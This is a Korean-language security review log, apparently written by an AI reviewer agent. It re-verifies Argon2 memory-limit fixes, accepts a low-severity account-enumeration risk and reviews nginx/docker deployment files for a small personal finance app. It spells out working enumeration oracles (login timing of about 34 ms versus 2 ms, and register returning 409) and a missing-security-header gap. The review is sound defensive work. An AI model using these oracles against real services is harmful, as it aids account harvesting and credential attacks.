4. `HashingError` 를 잡아 **503**(자원 부족, 재시도 가능)으로 응답한다. 500 은 원인을 숨긴다.
5. 회귀 테스트: 설정된 파라미터가 실제로 적용되는지 검증하는 테스트 1건.

### 게이트 판정
- **커밋 게이트(G1)는 통과 유지.** 신규 코드 변경이 아니라 기존 통과 코드에 대한 **신규 발견**이고,
  배포 전에는 악용 경로가 성립하지 않는다. 여기서 커밋을 막으면 진행 중인 작업만 멈춘다.
- **단 `SR8-1` 은 `open_findings` 로 등록하고, G5(사람 승인 배포)의 차단 조건으로 둔다.**
  이 상태로 배포하면 **인증 5건만으로 실서비스 서버가 위험**하다.

---

## SR-009 · 2026-07-25 · SR8-1 수정 재검증 (re-review, 반려 당사자)

**판정: `SR8-1` CLOSE (PASS)** · 지시 `2026-07-25-16-review` · 대상 `ORDER 2026-07-25-13-arch`
(커밋 `b3615fd`) · 잔여 1건은 **`SR8-2`** 로 승계

> 기록 정정: 지시서는 "체크포인트 7개"라 했으나 `.review-state.json::SR8-1` 에 내가 남긴
> 통과조건은 **5개**다. 지시서가 지목한 4개 항목과 합쳐 **중복 제외 9개**를 전부 검증했다.

### 통과조건 ①~⑤ 대조

| # | 통과조건 | 결과 | 실측 근거 |
|:--:|---|:--:|---|
| ① | Argon2 파라미터 명시(OWASP 하한 이상) | **PASS** | `memory_cost=19456`(19MiB) `time_cost=2` `parallelism=1` `type=Type.ID` — 해셔 객체에서 직접 확인 |
| ② | compose 메모리 제한 | **PASS** | `docker-compose.yml` `mem_limit: 256m / 192m / 192m`, `memswap_limit` 동일 설정으로 스왑 누수 차단 |
| ③ | 인증 경로 동시성 제한 | **PASS** | 아래 (1) — **계측된** 최대 동시 해시 4 |
| ④ | `HashingError` → 503 | **부분 충족** | `HashCapacityError`→503 은 구현. **argon2 `HashingError`→여전히 500** → `SR8-2` 로 승계 |
| ⑤ | 회귀 테스트 | **PASS** | `test_security.py` 에 하한·동시성·슬롯·기존해시 등 **12건** 신설(총 33건) |

### 지시서 지목 4개 항목

**(1) 최악 메모리가 실제 76 MiB 로 떨어지는가 — PASS (설정 읽기가 아니라 계측)**
`PasswordHasher.hash` 를 감싸 **실제 동시 실행 수**를 셌다. 40개 요청을 동시 투입했을 때
관측된 **최대 동시 해시 = 4** (설정 `argon2_concurrency=4` 와 일치).
→ 최악 메모리 **4 × 19 MiB = 76 MiB**.
SR-008 시점 대비: 스레드풀 기준 2,560 MiB → 76 MiB, nginx `burst=5` 기준 320 MiB → 76 MiB.
**배포 VPS 여유 332 MB 를 소진하던 문제는 해소**됐다.

**(2) 하한 미만 파라미터가 정말 기동을 차단하는가 — PASS (두 겹 모두 동작)**
- 1겹 기동점검 `argon2_parameter_problems()`: `m=8192·t=1·p=0·concurrency=0` 투입 → **4건 전부 검출**
- 2겹 해시생성 길목 `_build_hasher(8192,1,1)` → `ValueError` 로 **차단**
  (기동점검은 호출을 강제할 수 없으므로 실제 해시를 만드는 길목에 문을 하나 더 단 설계가 옳다)
- **경계값**(정확히 하한 `19456/2/1`)은 **정상 허용** — off-by-one 으로 정상 설정을 막지 않는다.
- 설계 판단도 타당하다: 메시지가 "메모리가 부족하면 파라미터가 아니라 `ARGON2_CONCURRENCY` 를
  줄이라"고 안내한다. 파라미터를 깎으면 **오프라인 크래킹 난이도가 영구히 내려가지만**,
  동시성을 줄이면 느려질 뿐 강도는 유지된다.

**(3) 인증 폭주가 다른 기능(지도)을 죽이는가 — PASS**
실제 앱(`TestClient`)에 인증 40건 동시 폭주 + 폭주 중 지도 10건 병행 호출:

| 항목 | 결과 |
|---|---|
| 인증 40건 | 200 × 40 · **500 = 0건** |
| 폭주 중 지도 | **200 × 10/10** (전부 성공) |
| 지도 응답 p50 | 평상시 2 ms → 폭주 중 **48 ms** (지연되나 생존) |

세마포어가 스레드풀 고갈을 막아 **인증 부하가 지도·리포트로 번지지 않는다.**
슬롯 고갈을 강제했을 때는 **503 `{"code":"BUSY"}` + `Retry-After: 1`** 로 인증만 흘려보낸다.

**(4) 기존 해시 재검증 호환 — PASS (마이그레이션 불필요)**
argon2 는 `m·t·p` 를 해시 문자열에 담으므로 파라미터를 바꿔도 옛 해시가 그대로 검증된다.
- 옛 64MiB 해시(`m=65536,t=3,p=4`) → `verify_password` **True**
- 틀린 비밀번호는 정상 **거부**
- 새 해시는 `m=19456,t=2,p=1`
- `needs_rehash(옛해시)` 는 True 지만 **자동 재해시 호출부를 두지 않았다** — 지금 재해시하면
  더 약한 해시로 내려가는 셈이라 **의도적으로 비워둔 것이 옳다**(코드 주석에도 근거 명시).

### 잔여 — `SR8-2` (신규 OPEN · low · 비차단)
통과조건 ④ 가 지목한 예외는 **argon2 `HashingError`**(실제 메모리 할당 실패 — SR-008 에서 내가
실제로 관측한 그 예외)인데, 이는 여전히 **어디서도 처리되지 않는다**(`grep HashingError` → 앱 코드 0건).
주입 실측 결과:

| 예외 | 응답 | 평가 |
|---|---|---|
| `HashCapacityError`(슬롯 고갈) | **503** `BUSY` + `Retry-After: 1` | 구현됨 — 옳다 |
| `argon2.HashingError`(할당 실패) | **500** `INTERNAL` | ④ 미충족 |

- 정보 유출은 없다(일반 메시지, 스택트레이스 미노출) — **G3 유지**.
- 세마포어로 발생 확률은 크게 낮아졌으나 0 은 아니다. backend 컨테이너 `mem_limit: 192m` 에서
  Argon2 76 MiB + 파이썬 런타임이 겹치면 여유가 넉넉하지 않다.
- 500 은 "서버 버그, 재시도 말라"는 뜻이라 **자원 부족 상황에 의미가 틀리다**. 503 이어야 한다.
- **통과 조건**: `HashingError` 를 `HashCapacityError` 와 같은 503 경로로 매핑 + 회귀 테스트 1건.

### 회귀
전체 **320 passed · 0 failed · 34 skipped**(전부 DB 부재) — **5회 연속 동일**.
SR-008 에서 8회 중 1회 관측했던 `argon2 HashingError` flake 는 **재현되지 않았다**
(64→19 MiB · 동시성 제한으로 기전이 해소됨). 커밋 메시지가 언급한 `test_rules_loader` 산발
실패도 5회 중 0건.

### 판정
**`SR8-1` CLOSE (PASS).** 핵심 위험 — *인증 소수 요청이 배포 VPS 여유 메모리를 소진하고
동거 실서비스(autobtc·itsmine)까지 OOM 으로 끌고 갈 수 있다* — 는 **계측으로 해소**됐다
(320 MiB → 76 MiB, 동시 해시 4 확인, compose 제한으로 폭발 반경 차단).
통과조건 ④ 의 미충족분은 **삭제하지 않고 `SR8-2` 로 승계**한다. 배포는 더 이상 이 건으로 막지 않는다.

---

## SR-010 · 2026-07-25 · SR8-2 재검증 CLOSE + 타이밍 계정열거 트리아지 (re-review)

지시 `2026-07-25-20-review` · 대상 커밋 `5aeac7d`

### 1) `SR8-2` 재검증 — **CLOSE (PASS)**

| 점검 | 결과 | 실측 |
|---|:--:|---|
| argon2 메모리부족이 503 인가(500 아님) | **PASS** | `HashingError` 주입 → 로그인 **503** `BUSY` + `Retry-After: 1`. 등록 경로도 **503** |
| `except` 순서가 계정열거를 만들지 않는가 | **PASS** | 아래 계층 분석 |
| verify 경로가 메모리부족을 `False` 로 안 삼키는가 | **PASS** | 함수 수준에서 `HashCapacityError` 로 전파 — `False` 반환 아님 |

**예외 계층 실측** — `VerifyMismatchError ⊂ VerificationError ⊂ Argon2Error` 이므로
`except VerifyMismatchError` 가 **반드시 먼저** 와야 한다. 실제 코드 순서
`VerifyMismatchError → Argon2Error → (InvalidHashError, ValueError)` 로 **정순**이다.
순서가 뒤바뀌면 *틀린 비밀번호가 503*, *없는 계정은 401* 이 되어 **상태코드가 곧 계정 존재
오라클**이 된다 — 그 함정을 피했다.
`InvalidHashError` 는 `Argon2Error` 하위가 **아니고** `ValueError` 하위라(실측), 마지막 절이
죽은 코드가 아니다 — 깨진 저장 해시는 의도대로 `False`(로그인 실패)로 남는다.

`Argon2Error` 로 넓게 잡은 판단도 타당하다: 잘못된 파라미터는 `_build_hasher` 가 기동 시점에
이미 걸러내므로 여기까지 온 argon2 오류는 사실상 자원 문제다. 좁게 잡았다가 하나 놓치면 그게 500 이 된다.
로그에 비밀번호가 실리지 않는 것도 확인(예외 타입·메시지만 기록).

**정상 경로 회귀**: 올바른 비번 200 / 틀린 비번 401 / 없는 계정 401 — 본문·상태 동일.
자원오류 처리가 로그인 판정을 바꾸지 않는다.

---

### 2) 신규 `SR10-1` — 타이밍 계정열거 · **판정: 수용(ACCEPTED, 비차단)**

re-arch 발견을 실측 검증하고 트리아지했다.

#### 실측 — 누출은 진짜다
로그인(틀린 비밀번호 고정), 각 15회:

| 대상 | p50 | min | max |
|---|---:|---:|---:|
| 존재하는 계정 | **34.3 ms** | 30.8 | 47.6 |
| 없는 계정 | **2.1 ms** | 1.9 | 3.3 |

**겹침 구간이 없다**(존재 min 30.8 > 부재 max 3.3). 통계 누적도 필요 없이
**단일 요청 + 임계값 하나로 100% 판별**된다. `routes.py:76` 의
`user is not None and verify_password(...)` 단축평가로 해시를 건너뛰기 때문이다.

#### ★ 그러나 더 쉬운 오라클이 이미 열려 있다
`POST /auth/register` 는 기존 이메일에 **409 `EMAIL_TAKEN`**, 신규엔 201 을 준다(실측).
**결정적·무잡음·단일요청** 오라클이라 타이밍보다 **훨씬 쉽다**.
→ **로그인 타이밍만 고치는 것은 보안 연극이다.** 더 약한 채널을 닫으면서 더 강한 채널을 열어둔다.

#### ⚠️ 기존 원장 판정 정정 (내가 쓴 것)
`security-review-log.md:135` 의 「계정 열거 ✅ 차단 — 미가입/틀린 비밀번호가 **동일 응답**」은
**부정확하다.** 근거 테스트는 **응답 본문·상태코드만** 비교했고, ⓐ 응답 **시간** 과
ⓑ `register` 의 409 를 보지 않았다. 두 채널 모두 열려 있으므로 "차단"은 과잉 주장이다.
→ **「응답 본문·상태코드로는 구분 불가. 단, 타이밍(SR10-1)과 register 409 로는 구분 가능」** 으로 정정한다.
(CR-008 의 "CHECK 자체는 정상", SR-005 의 SR4-2 주장과 같은 범주 — 내 판정도 예외가 아니다.)

#### SR8-1 과의 저울질 — **"상충"은 과대평가다**
re-arch 는 더미해시가 없는계정 폭주까지 슬롯을 먹어 SR8-1 과 상충한다고 봤다. 절반만 맞다.

1. **메모리 상한은 그대로다.** 세마포어가 동시 해시를 4(=76 MiB)로 묶는 건 **누가 유발하든**
   동일하다. SR8-1 의 핵심 보호(메모리 고갈 → 동거 실서비스 OOM 전파)는 **전혀 약해지지 않는다.**
2. **슬롯 소진 경로는 이미 존재한다.** 공격자는 지금도 *존재하는* 이메일(직접 가입한 계정 포함)로
   로그인을 퍼부어 같은 4슬롯을 점유할 수 있다. 더미해시는 **새 능력을 주지 않고**, 없는계정이라는
   *공짜 경로*를 없앨 뿐이다.
3. **처리량 계산**: 4슬롯 ÷ 34 ms ≈ **117 해시/s**. nginx 인증 zone 은 IP당 1r/s(burst 5)이므로
   포화시키려면 **약 117개 IP** 가 필요하다 — 그리고 그 분산공격은 **오늘도 기존 이메일로 가능**하다.

→ 실제 비용은 "분산 폭주 시 로그인 가용성이 조금 더 일찍 저하된다" 정도다.
그 비용을 치르고 **두 채널 중 약한 쪽만** 닫는 건 가장 나쁜 거래다.

#### 심각도 — **low**
- 사용자 규모가 **개인·소수**다(CLAUDE.md: "누가 씀: 나 개인", "사용자 규모: 소수"). 수확할
  사용자 명부가 없고, 이 앱을 노리는 공격자는 이미 소유자 이메일을 안다.
- 열거는 **금융정보 자체를 노출하지 않는다** — 크리덴셜 스터핑의 선행 단계일 뿐이다(G3 유지).
- nginx `1r/s` 로 수확 처리량이 묶인다.
- 다만 계정이 **개인 금융정보(자산·소득·대출)** 를 담으므로 공개 가입이 열리면 재평가해야 한다.

#### 배포 차단 여부 — **차단하지 않음**
G5 를 막지 않는다. 지금 급히 더미해시를 넣으면 가용성만 깎고 열거는 그대로다.

#### 수용 근거 · 재평가 조건 (수용이므로 근거를 남긴다)
**수용한다.** 단 아래 중 **하나라도 발생하면 즉시 재평가**한다:
1. 가족·지인 등 **본인 외 사용자**가 생기거나 공개 가입이 열릴 때
2. 계정 명부가 가치를 갖는 규모가 될 때
3. 인증 실패 로그인 시도가 비정상적으로 관측될 때

**고칠 때는 두 채널을 함께** 고친다(반쪽은 연극이다):
- `register`: 기존/신규 동일 응답(202 수락) + 이메일 인증으로 실제 가입 완결
- `login`: 없는계정 분기에 **고정 지연(~35 ms)** — Argon2 를 돌리지 않으므로 **슬롯·19 MiB 를
  쓰지 않아 SR8-1 과의 긴장이 사라진다.** 더미해시보다 이쪽이 낫다.
  ※ 한계는 정직하게: 고정 지연은 평균은 맞추지만 **분산은 다르다**(Argon2 는 부하에 따라 흔들리고
  고정 지연은 안 흔들린다). 정밀 측정에는 여전히 구분 여지가 남는다 — 완전 해소는 아니다.

### 회귀
전체 **327 passed · 0 failed · 34 skipped** — **3회 연속 동일**.

### 판정
**`SR8-2` CLOSE (PASS).** **`SR10-1` 신규 등록 — 수용(ACCEPTED), 비차단.**
기존 「계정 열거 차단」 판정은 위와 같이 **정정**한다.

---

## SR-011 · 2026-07-25 · 배포 준비물 안전 검증 (re-review)

**판정: FAIL — G5 전 수정 필요 2건 + 권고 1건** · 지시 `2026-07-25-21-review` · 대상 `19-arch`(커밋 `fcff115`)

> 먼저 분명히 해 둔다: **파괴적 산출물은 없다.** 격리·롤백·유출 방어 설계는 견고하다.
> FAIL 사유는 "위험해서"가 아니라 **DEPLOY.md §5-4 에서 절차가 물리적으로 막히기 때문**이다.
> 재설계가 아니라 **3건 고치고 재검증**이면 된다.

### (1) pause/resume — **PASS**
- `pause-itsmine.sh` 전 명령 확인: **`docker stop` 뿐**. `rm`·`rmi`·`volume`·설정수정 **0건**.
- `docker ps` (실행 중만) 로 목록을 잡아 **원래 꺼져 있던 컨테이너를 resume 이 켜지 않는다.**
- 목록을 **중지 전에** 기록한다(중간 실패해도 복구 목록이 남는다). `--dry-run` 제공.
- `resume` 은 **목록 파일만** 본다. 부분 실패 시 목록을 **지우지 않아** 무엇이 안 돌아왔는지 보존.
- 비차단 관찰 3건:
  - `docker ps --filter name=` 은 **부분일치**다. `itsmine` 패턴이 의도 밖 컨테이너를 잡을 여지가 있어
    `--dry-run` 선행이 필수인데, DEPLOY.md 가 이미 강제하고 있다 — 유효.
  - `pause` 를 두 번 돌리는 사이 itsmine 하나가 수동 기동되면 목록이 **작은 쪽으로 덮인다**(희박).
  - `--force` 는 `status=exited` 를 확인 없이 start 한다. 다른 이유로 죽어 있던 것도 켤 수 있다(비상경로 명시됨).

### (2) docker-compose.deploy.yml — **PASS**
| 점검 | 결과 |
|---|---|
| api+db 만 | ✅ nginx·worker·redis 제외 (worker 무한재시작 루프 회피 근거 타당) |
| db 포트 미노출 | ✅ `ports` 없음. "Docker 가 ufw 를 우회한다"는 근거도 정확 |
| api 포트 | ✅ `127.0.0.1:8013` 바인드 — 공인 IP 미노출 |
| 메모리 제한 | ✅ `mem_limit`·`memswap_limit` 각 192m |
| 이름 충돌 | ✅ project `realestate` · 컨테이너 `realestate-{db,api}` · 네트워크 `realestate-internal` · 볼륨 `realestate-pgdata` — autobtc/itsmine 과 겹치지 않음 |
| 마이그레이션 | ✅ `:ro` 마운트, 빈 볼륨 첫 기동에만 적용 |

### (3) nginx-realestate.conf — **FAIL (2건)**
**잘 된 것**: 별도 파일이라 기존 서버블록 무변경 · zone 이름 `re_api`/`re_auth`/`re_ssl` 접두로
duplicate zone 회피(충돌 시 **nginx 전체가 안 떠 동거 서비스까지 죽는** 사고를 막음) ·
`proxy_params` 의존 제거(배포판별 부재로 `nginx -t` 실패하는 함정 회피) ·
`proxy_intercept_errors off` 로 SR8-2 의 503 보존 · 정규식 auth location 이 `/api/` 보다 우선(정상).

#### ⛔ `DEP-1` (medium) — `add_header` 상속이 끊겨 **index.html 에 보안헤더가 안 붙는다**
nginx 규칙: *하위 레벨에 `add_header` 가 하나라도 있으면 상위 레벨 `add_header` 를 **전혀 상속하지 않는다**.*
`always` 플래그는 오류응답 포함 여부를 정할 뿐 **상속과 무관**하다.

- `location = /index.html` → `add_header Cache-Control "no-store"` 존재 → 서버블록의
  **HSTS·X-Content-Type-Options·X-Frame-Options·Referrer-Policy 4종이 전부 탈락**.
- 중첩 `location ~* \.(js|css|woff2?|png|jpg|svg)$` 도 동일하게 4종 탈락.
- `try_files $uri $uri/ /index.html` 은 **내부 리다이렉트**라 location 매칭을 다시 타므로,
  `GET /` 도 결국 `location = /index.html` 로 들어간다 → **사용자가 실제로 여는 문서에 헤더가 없다.**
- 영향: `X-Frame-Options DENY` 상실 → **클릭재킹 방어가 본 화면에서 사라진다**(개인 금융정보 서비스).
  정적 JS/CSS 의 `nosniff` 상실도 함께. HSTS 는 같은 호스트의 API 응답으로 대체 확립되므로 영향이 덜하다.
- **방증**: DEPLOY.md §5-6 의 자체 검증 `curl -sI https://.../ | grep -i strict-transport` 는
  **빈 결과**가 나온다. 문서가 통과로 적어 둔 확인이 실제로는 실패한다.
- **통과 조건**: 두 location 에 보안헤더 4종을 **다시 명시**(또는 `add_header` 를 쓰지 않도록 재구성).

#### ⛔ `DEP-2` (blocker) — 인증서가 없어 `nginx -t` 가 실패, **절차가 진행 불가**
`listen 443 ssl` + `ssl_certificate /etc/letsencrypt/live/realestate.utilverse.info/fullchain.pem`
인데, 그 파일은 **§5-5 certbot 이후에야 생긴다**(preflight §6 도 "인증서 없음"을 경고한다).
- §5-4 `sudo nginx -t` → `[emerg] cannot load certificate ... No such file or directory` → **실패**.
- §5-5 `certbot --nginx` 도 **깨진 설정을 파싱하다 실패**한다. 앞으로 못 간다.
- ⚠️ 안전장치 자체는 **유효하다** — "통과했을 때만 reload" 규칙이 깨진 채 reload 하는 사고를 막는다.
  진짜 위험은 **막힌 상태에서 운영자가 손으로 고치려 드는 것**이다. 그 순간 동거 서비스가 위태롭다.
- **통과 조건(택1)**:
  ⓐ 임시 HTTP 전용 블록으로 `certbot certonly --webroot -w /var/www/certbot -d <도메인>` 먼저 발급 →
     인증서 확보 후 본 conf 배치 → `nginx -t` 통과 → reload, 또는
  ⓑ 본 conf 의 443 서버블록을 주석 처리해 배치 → certbot 발급 → 주석 해제 → `nginx -t` → reload.

### (4) DEPLOY.md — **FAIL (DEP-2) · 그 외 안전**
- ✅ 롤백이 **역순**이고 각 단계 독립: nginx 노출 제거 → `down`(데이터 보존) → **itsmine 복구**.
- ✅ 통상 롤백은 `down` 이고 `-v` 는 별도 항목으로 분리 + "되돌릴 수 없다" 경고 — 옳다.
- ✅ 파괴적 단계는 모두 사람 승인 뒤. preflight 는 읽기 전용(변경 명령 0건 확인).
- ✅ `nginx -t` 게이트, `--dry-run` 선행, `docker stats` 90% 초과 시 보고 규칙.
- ⛔ `DEP-2` 순서 문제(위).

#### ⚠️ `DEP-3` (medium · 권고) — **백엔드 이미지를 서버에서 빌드한다**
§5-3 `docker compose build api` 는 **db 가 이미 떠 있는 상태에서** 서버에서 돈다.
- **빌드 프로세스는 `mem_limit` 의 보호를 받지 않는다.** `mem_limit` 은 런타임 서비스에만 적용된다.
- 그 시점 여유 ≈ 400 − db 실사용 146 ≈ **254MB**. 이 절차 전체에서 **유일하게 상한이 없는 소비자**다.
- 프론트는 같은 이유(vite OOM)로 **로컬 빌드+rsync 로 옮겨 놓고**, 백엔드 빌드는 서버에 남겼다 — **일관성 결여**.
- requirements 는 전부 manylinux wheel 이라 컴파일이 없어 실패 가능성은 낮다. 다만 여기서 OOM 이 나면
  cgroup 이 아니라 **호스트 전역 OOM killer** 가 도는데, 그 희생자는 RSS 최대인 **autobtc(195MB)** 가 되기 쉽다.
- **권고(비용 최소)**: `build api` 를 **`up -d db` 앞으로** 옮긴다 — 빌드가 400MB 를 온전히 쓴다. 한 줄 변경.
  더 나은 방법: 로컬 빌드 후 `docker save | ssh … docker load`(프론트와 같은 원칙).

### (5) 메모리 16MB 타당성 — **산술은 맞음. 단 결론 표현이 오해를 부른다**
- 산술 검증: `332 + 68 = 400`, `192 + 192 = 384`, `400 − 384 = 16` — **맞다**.
- 다만 384 는 **상한의 합**이지 예상 사용량이 아니다. 같은 문서의 추정(db 146 + api 158 = **304MB**)을
  쓰면 실제 여유는 **약 96MB** 다. "16MB"는 두 컨테이너가 **동시에 상한에 붙은 최악값**이다.
  → 문서가 최악값만 굵게 적어 실제보다 위태로워 보인다. **두 수치를 함께** 적는 편이 정확하다.
- **autobtc 보호는 설계상 타당하다**: `memswap_limit = mem_limit` 이라 우리 컨테이너는 스왑으로 새지 않고
  **자기 cgroup 안에서** OOM-kill 된다. 호스트를 끌고 내려가지 않으므로 autobtc 는 보호된다.
  호스트에 swap 2GB 도 있어 완충이 한 겹 더 있다.
- **단, 그 보호가 미치지 않는 구멍이 `DEP-3`(빌드)** 다. 스파이크 시 autobtc 가 위험해지는 경로는 사실상 이것뿐이다.
- preflight 임계값 확인: `AFTER(400) >= NEED+32(416)` 아님 → `AFTER >= NEED(384)` 성립 →
  **"여유가 얇다(<32MB). 사람 판단 필요"** 로 분기한다. 자동 승인하지 않고 사람에게 넘긴다 — **정직하다.**

### (6) 실IP·키 유출 — **PASS**
- 공인 IP **0건**, 하드코딩 시크릿 **0건**(정규식 전수 스캔).
- `.env.example` 의 비밀값은 **전부 빈 값**. `deploy-target.local.md` 는 **미추적 + gitignore**
  (`.env`, `.env.*`, `*.local.md`, `deploy-target.local.md`).
- preflight 가 `FIELD_ENCRYPTION_KEY` 를 **길이만** 검사하고 값을 출력하지 않는다 — 좋다.
- 도메인 `realestate.utilverse.info` 는 저장소에 있다(re-arch 자체 신고 3번). **보안상 문제 없음** —
  공개 DNS 이며 certbot 발급 순간 **CT 로그로 어차피 공개**된다. 없으면 nginx 블록·certbot 명령이 성립하지 않는다.
  → **수용 권고.** 다만 저장소가 그 외에는 플레이스홀더로 일관돼 있으므로, 일관성을 원하면
  `<APP_DOMAIN>` + 배포 시 `sed` 로 바꾸면 된다. **보안 판단이 아니라 취향 결정이라 사람 몫**이다.
- 비차단: `backend/.dockerignore` **부재** → `tests/`·`__pycache__` 가 빌드 컨텍스트·이미지에 실린다.
  비밀은 없으나 디스크가 빠듯한 서버에서 이미지가 커진다. 권고 수준.

### 판정
**FAIL.** 안전성(파괴성·격리·롤백·유출)은 **전부 통과**했으나, `DEP-2` 로 **절차가 §5-4 에서 막히고**
`DEP-1` 로 **본 화면의 클릭재킹 방어가 사라진다.**
**G5 전 필수: `DEP-2`(인증서 순서) · `DEP-1`(헤더 재명시). 강력 권고: `DEP-3`(빌드를 db 기동 앞으로).**
이 3건 수정 후 재검증하면 통과 가능하다 — 재설계가 필요한 사안은 없다.

---

## SR-012 · 2026-07-25 · DEP-1/2/3 수정 재검증 — 배포 준비물 **PASS** (re-review)

**판정: PASS · `DEP-1`·`DEP-2`·`DEP-3` 전부 CLOSE · 배포 준비물 G5 진행 가능**
지시 `2026-07-25-23-review` · 대상 `22-arch`(커밋 `883bc2b`) · 앱 코드 무변경(배포 산출물만)

### `DEP-2` (blocker) — CLOSE
**부트스트랩 분리로 `nginx -t` 가 더 이상 깨지지 않는다.**
- `nginx-realestate-bootstrap.conf` 신설: **HTTP 전용, `ssl_certificate` 참조 0건** →
  인증서가 없어도 `nginx -t` 가 통과한다. 발급 전 단계에서 앱 경로는 `return 404` 로 막아
  **평문 HTTP 로 인증 API 가 노출되지 않는다** — 부수적으로 잘 잡은 부분이다.
- 절차 `§5-5`: (1) 부트스트랩 배치 → `nginx -t` → reload  (2) 발급  (3) 본 conf 교체 → `nginx -t` → reload.
  **`nginx -t` 게이트가 2회** 걸리고, 각 게이트는 "통과했을 때만 reload" 로 묶여 있다.
- **`certonly --webroot` 로 교체 — `--nginx` 자동수정 위험 제거 확인.**
  근거도 정확히 적혀 있다: "`--nginx` 는 nginx 설정을 **자동으로 고쳐 쓴다.** 동거 서비스 설정이
  있는 서버에서 자동 수정은 위험하다. `certonly` 는 인증서만 받고 설정은 건드리지 않는다."
  → 내가 21-review 에서 지목한 위험이 정확히 해소됐다.
- **교체 정합성 확인**: 부트스트랩·본 conf 모두 배치 대상이 동일 파일
  `/etc/nginx/sites-available/realestate.conf` 다 → `cp` 가 덮어써 **부트스트랩이 확실히 사라진다.**
  두 블록이 공존해 `server_name` 이 충돌하거나 zone 이 중복될 여지가 없다.
- **갱신 지속성 확인**: webroot 경로가 세 곳(`certbot` 명령·부트스트랩·본 conf) 모두
  `/var/www/certbot` 로 일치하고, 본 conf 의 :80 블록에 `/.well-known/acme-challenge/` 가
  남아 있어 부트스트랩이 사라진 뒤에도 `certbot renew` 가 동작한다.
- **추가로 좋아진 것**: `<APP_ROOT>` 치환 누락 검사(`grep -n '<APP_ROOT>' … && echo "진행 금지"`),
  그리고 **"막혔을 때 손으로 고치지 말고 되돌린 뒤 보고"** 지침.
  후자는 내가 지목한 *진짜 위험*(막힌 상태에서의 임의 수정)을 정면으로 막는다.

### `DEP-1` (medium) — CLOSE
**두 location 에 보안헤더 4종이 실제로 있다. 기계적 전수 확인했다.**
conf 를 파싱해 `add_header` 를 쓰는 **모든** 블록이 4종을 갖췄는지 검사한 결과:

| 블록 | 판정 |
|---|:--:|
| `server` | OK (4종) |
| `location / > location ~* \.(js\|css\|woff2?\|png\|jpg\|svg)$` | OK (Cache-Control + **4종**) |
| `location = /index.html` | OK (Cache-Control + **4종**) |
| `location /`·`/api/`·auth 정규식·ACME | `add_header` 없음 → 서버레벨 **정상 상속** |

**누락 0건.** 각 자리에 *왜 다시 적는지*(상속이 끊긴다)를 주석으로 남긴 것도 재발 방지에 유효하다.

#### §5-6 `check_headers()` 가 "빈 결과 통과" 함정을 실제로 잡는가 — **실행 검증했다**
내가 21-review 에서 방증했던 결함 응답(Cache-Control 만 남고 4종 탈락)을 그대로 넣어 함수를 돌렸다:

| 입력 | 결과 |
|---|---|
| 수정 후 정상 응답 | `[OK]` × 4 |
| **결함 상태(21-review 방증 응답)** | **`[실패]` × 4** |

기존 `grep -i strict-transport` 는 헤더가 없으면 **아무것도 출력하지 않아** 사람이 그냥 넘어갈 수
있었다(그렇게 놓쳤던 항목이다). 새 함수는 없을 때 **`[실패]` 를 명시적으로 찍는다** → 함정 해소.
검사 대상도 `/`(try_files 로 index.html 을 타는 가장 중요한 경로)·`/index.html`·`/api/v1/health`·
정적 자산(빌드마다 이름이 달라 동적 탐색)으로 **4개 경로를 모두** 덮는다.

### `DEP-3` (medium) — CLOSE
`§5-2 build api` 가 `§5-3 up -d db` **앞으로** 이동했다. 근거도 정확히 기술돼 있다
(빌드는 `mem_limit` 보호를 받지 않는 유일한 구간 · db 를 먼저 띄우면 146MB 줄어든 자리에서 빌드 ·
여기서 OOM 이면 호스트 전역 OOM killer 가 돌고 희생자는 RSS 최대인 autobtc).
로컬 빌드 + `docker save | ssh … docker load` 대안과 `up -d --no-build` 주의까지 함께 제시했다.
`§5-4` 도 "5-2 에서 이미 빌드됨" 으로 정합하게 수정됐다.

### 비차단 지적도 반영됨
`backend/.dockerignore` 신설(20개 항목) — `tests/`·`conftest.py`·`requirements-dev.txt` 등 제외.
`Dockerfile` 이 `COPY . .` 를 쓰므로 실효가 있다.

### 잔여 위험 — **둘 다 수용 가능**

**① `add_header` 상속 함정이 location 추가 시 재발할 수 있다 — 수용**
이는 이 설정의 결함이 아니라 **nginx 자체의 성질**이라 구조적으로 없앨 수 없다. 다만 통제가 세 겹이다:
(ⓐ) 두 위험 지점에 *왜 다시 적는지* 주석이 있어 편집자가 보게 된다,
(ⓑ) `§5-6 check_headers()` 가 배포 때마다 4개 경로를 실제 응답으로 검증한다,
(ⓒ) 실패 시 무엇을 확인할지("해당 location 에 4종이 다시 적혀 있는지")까지 문서가 지목한다.
한계는 정직하게: **check_headers 는 배포 시점에만 돌고 4개 대표 경로만 본다.** 나중에 location 을
추가하고 재실행하지 않으면 놓친다. 개인 규모 배포에 CI nginx 린팅까지 요구하는 건 과하다고 본다.
→ **수용.** 원하면 이번에 쓴 정적 감사 스크립트(모든 `add_header` 블록의 4종 보유 검사)를
2차에 회귀 검사로 넣으면 된다 — 권고 수준.

**② `nginx -t` 를 로컬에서 못 돌렸다 — 수용**
로컬에 nginx 가 없어(확인함) 문법 검증은 서버에서만 가능하다. 그러나 **실패 양상이 안전하다**:
`nginx -t` 는 reload **전에** 돌고, 통과했을 때만 reload 한다. 즉 문법 오류가 있어도
**돌고 있는 nginx 와 동거 서비스는 영향을 받지 않고**, 결과는 "서비스 다운"이 아니라 "배포 중단"이다.
게이트가 2회이고 실패 시 되돌림 경로와 "손대지 말라"는 지침까지 있다.
내가 한 것은 블록 구조 파싱 성공(중괄호·지시어 정합)뿐이며 이는 **well-formed 의 약한 근거이지
`nginx -t` 의 대체가 아니다** — 그렇게 주장하지 않는다.
→ **수용.** 단 배포 당일 `§5-5` 의 `nginx -t` 결과를 **사람이 반드시 눈으로 확인**해야 한다.

### 판정
**PASS.** `DEP-1`·`DEP-2`·`DEP-3` 전부 통과 조건을 충족했고, 반박 없이 수용해 정확히 고쳤다.
21-review 에서 FAIL 사유였던 "절차가 §5-4 에서 막힌다"와 "본 화면 클릭재킹 방어 상실"이 모두 해소됐다.
**배포 준비물은 안전 검증을 통과했다 — 남은 것은 `19-arch` G5 결정 4건(사람)뿐이다.**

---

## SR-013 · 2026-07-25 · apt_dong/동 실측 + MOLIT 운영 엔드포인트 전환 (herdr re-review 대행)

**판정: PASS**
검증자: `security-reviewer` (herdr re-review 대행 · 독립 감사)
범위: `trade.apt_dong` 컬럼 추가 + 수집 엔드포인트 개발용(Dev)→운영 전환
대상: `backend/app/ingest/{molit,loader,normalize,run_molit}.py`, `config/sources.yaml`,
`backend/migrations/006_trade_apt_dong.sql`(신규), `backend/tests/test_ingest.py`, `docs/02-design/erd.md`(§0)
